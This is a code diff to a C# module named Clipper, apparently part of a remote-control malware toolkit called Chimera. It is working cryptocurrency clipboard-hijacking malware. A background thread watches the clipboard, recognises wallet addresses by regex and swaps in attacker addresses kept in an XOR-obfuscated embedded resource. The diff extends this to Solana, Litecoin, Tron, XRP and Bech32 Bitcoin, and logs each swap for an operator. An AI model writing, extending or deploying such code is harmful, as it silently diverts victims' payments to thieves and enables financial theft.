@@ -13,19 +13,33 @@ namespace Chimera.Commands
     public static class Clipper
     {
         // ── Regex patterns ────────────────────────────────────────────────────────
-        private static readonly Regex RxBtc = new Regex(
+        private static readonly Regex RxBtcLegacy = new Regex(
             @"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", RegexOptions.Compiled);
+        private static readonly Regex RxBtcBech32 = new Regex(
+            @"^bc1[ac-hj-np-z02-9]{6,87}$", RegexOptions.Compiled);
         private static readonly Regex RxEth = new Regex(
             @"^0x[a-fA-F0-9]{40}$", RegexOptions.Compiled);
         private static readonly Regex RxXmr = new Regex(
             @"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", RegexOptions.Compiled);
+        private static readonly Regex RxSol = new Regex(
+            @"^[1-9A-HJ-NP-Za-km-z]{43,44}$", RegexOptions.Compiled);
+        private static readonly Regex RxLtc = new Regex(
+            @"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", RegexOptions.Compiled);
+        private static readonly Regex RxTrx = new Regex(
+            @"^T[A-Za-z1-9]{33}$", RegexOptions.Compiled);
+        private static readonly Regex RxXrp = new Regex(
+            @"^r[a-zA-Z0-9]{24,34}$", RegexOptions.Compiled);
 
         // ── State ─────────────────────────────────────────────────────────────────
-        private static Thread  _thread   = null;
-        private static bool    _running  = false;
-        private static string  _addrBtc  = null;
-        private static string  _addrEth  = null;
-        private static string  _addrXmr  = null;
+        private static Thread  _thread    = null;
+        private static bool    _running   = false;
+        private static string  _addrBtc   = null;
+        private static string  _addrEth   = null;  // covers ETH + BNB (same 0x format)
+        private static string  _addrXmr   = null;
+        private static string  _addrSol   = null;
+        private static string  _addrLtc   = null;
+        private static string  _addrTrx   = null;
+        private static string  _addrXrp   = null;
         private static int     _swapCount = 0;
         private static readonly object _lock = new object();
 
@@ -38,8 +52,7 @@ namespace Chimera.Commands
                 case "start":  return Start();
                 case "stop":   return Stop();
                 case "status": return Status();
-                default:
-                    return "[error] Usage: clipper start | stop | status";
+                default:       return "[error] Usage: clipper start | stop | status";
             }
         }
 
@@ -48,23 +61,23 @@ namespace Chimera.Commands
         {
             lock (_lock)
             {
-                if (_running)
-                    return "[-] Clipper already running.";
-
-                // Load swap addresses from embedded resource
+                if (_running) return "[-] Clipper already running.";
                 string loadErr = LoadAddresses();
                 if (loadErr != null) return loadErr;
-
                 _running   = true;
                 _swapCount = 0;
                 _thread    = new Thread(MonitorLoop) { IsBackground = true };
-                _thread.SetApartmentState(ApartmentState.STA); // Clipboard needs STA
+                _thread.SetApartmentState(ApartmentState.STA);
                 _thread.Start();
             }
             return "[+] Clipper started.\n" +
-                   "    BTC swap: " + (_addrBtc ?? "(none)") + "\n" +
-                   "    ETH swap: " + (_addrEth ?? "(none)") + "\n" +
-                   "    XMR swap: " + (_addrXmr ?? "(none)");
+                   "    BTC     : " + (_addrBtc ?? "(none)") + "\n" +
+                   "    ETH/BNB : " + (_addrEth ?? "(none)") + "\n" +
+                   "    XMR     : " + (_addrXmr ?? "(none)") + "\n" +
+                   "    SOL     : " + (_addrSol ?? "(none)") + "\n" +
+                   "    LTC     : " + (_addrLtc ?? "(none)") + "\n" +
+                   "    TRX     : " + (_addrTrx ?? "(none)") + "\n" +
+                   "    XRP     : " + (_addrXrp ?? "(none)");
         }
 
         // ── Stop ──────────────────────────────────────────────────────────────────
@@ -72,8 +85,7 @@ namespace Chimera.Commands
         {
             lock (_lock)
             {
-                if (!_running)
-                    return "[-] Clipper not running.";
+                if (!_running) return "[-] Clipper not running.";
                 _running = false;
             }
             if (_thread != null) _thread.Join(1500);
@@ -83,29 +95,22 @@ namespace Chimera.Commands
         // ── Status ────────────────────────────────────────────────────────────────
         private static string Status()
         {
-            bool   r = _running;
-            int    s = _swapCount;
-            string b = _addrBtc ?? "(not loaded)";
-            string e = _addrEth ?? "(not loaded)";
-            string x = _addrXmr ?? "(not loaded)";
             return string.Format(
-                "Clipper status: {0}\n" +
-                "  Swaps so far : {1}\n" +
-                "  BTC addr     : {2}\n" +
-                "  ETH addr     : {3}\n" +
-                "  XMR addr     : {4}",
-                r ? "RUNNING" : "STOPPED", s, b, e, x);
+                "Clipper: {0} | Swaps: {1}\n" +
+                "  BTC     = {2}\n  ETH/BNB = {3}\n  XMR     = {4}\n" +
+                "  SOL     = {5}\n  LTC     = {6}\n  TRX     = {7}\n  XRP     = {8}",
+                _running ? "RUNNING" : "STOPPED", _swapCount,
+                _addrBtc ?? "?", _addrEth ?? "?", _addrXmr ?? "?",
+                _addrSol ?? "?", _addrLtc ?? "?", _addrTrx ?? "?", _addrXrp ?? "?");
         }
 
         // ── Background monitor ────────────────────────────────────────────────────
         private static void MonitorLoop()
         {
             string lastSeen = null;
-
             while (true)
             {
                 lock (_lock) { if (!_running) break; }
-
                 try
                 {
                     string text = Clipboard.GetText();
@@ -117,7 +122,6 @@ namespace Chimera.Commands
                             Clipboard.SetText(swap);
                             lastSeen = swap;
                             Interlocked.Increment(ref _swapCount);
-                            // Log to staging dir for operator review
                             try
                             {
                                 string log = DateTime.UtcNow.ToString("u") +
@@ -128,30 +132,31 @@ namespace Chimera.Commands
                             }
                             catch { }
                         }
-                        else
-                        {
-                            lastSeen = text;
-                        }
+                        else { lastSeen = text; }
                     }
                 }
-                catch { /* clipboard may be locked by another process */ }
-
+                catch { /* clipboard locked */ }
                 Thread.Sleep(500);
             }
         }
 
-        // ── Pattern matching ──────────────────────────────────────────────────────
+        // ── Pattern matching — SOL/TRX/XRP first (most specific patterns) ─────────
         private static string FindSwap(string text)
         {
-            if (_addrBtc != null && RxBtc.IsMatch(text)) return _addrBtc;
+            if (_addrTrx != null && RxTrx.IsMatch(text)) return _addrTrx;
+            if (_addrXrp != null && RxXrp.IsMatch(text)) return _addrXrp;
+            if (_addrSol != null && RxSol.IsMatch(text)) return _addrSol;
+            if (_addrBtc != null && RxBtcBech32.IsMatch(text))   return _addrBtc;
+            if (_addrBtc != null && RxBtcLegacy.IsMatch(text))   return _addrBtc;
             if (_addrEth != null && RxEth.IsMatch(text)) return _addrEth;
             if (_addrXmr != null && RxXmr.IsMatch(text)) return _addrXmr;
+            if (_addrLtc != null && RxLtc.IsMatch(text)) return _addrLtc;
             return null;
         }
 
         // ── Load addresses from embedded crypto_map_enc resource ──────────────────
-        // Resource is XOR-encrypted (key 0x41) JSON:
-        //   {"btc":"1YourBTCAddress","eth":"0xYourETHAddress","xmr":"4YourXMRAddress"}
+        // XOR key 0x41, JSON format:
+        // {"btc":"...","eth":"...","xmr":"...","sol":"...","ltc":"...","trx":"...","xrp":"..."}
         private static string LoadAddresses()
         {
             try
@@ -160,36 +165,31 @@ namespace Chimera.Commands
                 var stream = asm.GetManifestResourceStream("crypto_map_enc");
                 if (stream == null)
                     return "[error] Resource 'crypto_map_enc' not found. " +
-                           "Bundle it with /res:crypto_map_enc,crypto_map_enc at build time.";
+                           "Bundle with /res:crypto_map_enc,crypto_map_enc at build time.";
 
                 byte[] enc = new byte[stream.Length];
                 stream.Read(enc, 0, enc.Length);
                 stream.Close();
-
-                // XOR decrypt
-                for (int i = 0; i < enc.Length; i++)
-                    enc[i] ^= 0x41;
-
+                for (int i = 0; i < enc.Length; i++) enc[i] ^= 0x41;
                 string json = System.Text.Encoding.UTF8.GetString(enc);
 
-                // Simple key-value extraction — no external JSON lib needed
                 _addrBtc = ExtractJsonString(json, "btc");
                 _addrEth = ExtractJsonString(json, "eth");
                 _addrXmr = ExtractJsonString(json, "xmr");
+                _addrSol = ExtractJsonString(json, "sol");
+                _addrLtc = ExtractJsonString(json, "ltc");
+                _addrTrx = ExtractJsonString(json, "trx");
+                _addrXrp = ExtractJsonString(json, "xrp");
 
-                if (_addrBtc == null && _addrEth == null && _addrXmr == null)
-                    return "[error] crypto_map_enc decoded but no btc/eth/xmr keys found. " +
-                           "Check JSON format: {\"btc\":\"...\",\"eth\":\"...\",\"xmr\":\"...\"}";
-
-                return null; // success
+                if (_addrBtc == null && _addrEth == null && _addrXmr == null &&
+                    _addrSol == null && _addrLtc == null && _addrTrx == null && _addrXrp == null)
+                    return "[error] crypto_map_enc decoded but no addresses found. " +
+                           "Check JSON format.";
+                return null;
             }
-            catch (Exception ex)
-            {
-                return "[error] LoadAddresses: " + ex.Message;
-            }
+            catch (Exception ex) { return "[error] LoadAddresses: " + ex.Message; }
         }
 
-        // Minimal JSON string extractor — finds "key":"value" pairs
         private static string ExtractJsonString(string json, string key)
         {
             string search = "\"" + key + "\":\"";
